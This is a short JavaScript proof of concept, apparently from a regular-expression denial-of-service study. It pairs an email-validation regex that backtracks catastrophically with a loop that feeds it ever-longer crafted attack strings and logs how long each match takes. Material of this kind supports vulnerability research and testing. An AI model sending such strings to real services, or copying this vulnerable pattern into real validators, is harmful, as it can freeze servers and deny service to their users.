/* 8408
 * ^[A-Za-z0-9](\.[\w\-]|[\w\-][\w\-])(\.[\w\-]|[\w\-]?[\w\-]){0,30}[\w\-]?@[A-Za-z0-9\-]{3,63}\.[a-zA-Z]{2,6}$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"A.1"+"-"*32+"!1 __EOA(iii)"
 */
var REGEX = /^[A-Za-z0-9](\.[\w\-]|[\w\-][\w\-])(\.[\w\-]|[\w\-]?[\w\-]){0,30}[\w\-]?@[A-Za-z0-9\-]{3,63}\.[a-zA-Z]{2,6}$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'A.1' + '-'.repeat(i*1) + '!1 __EOA(iii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}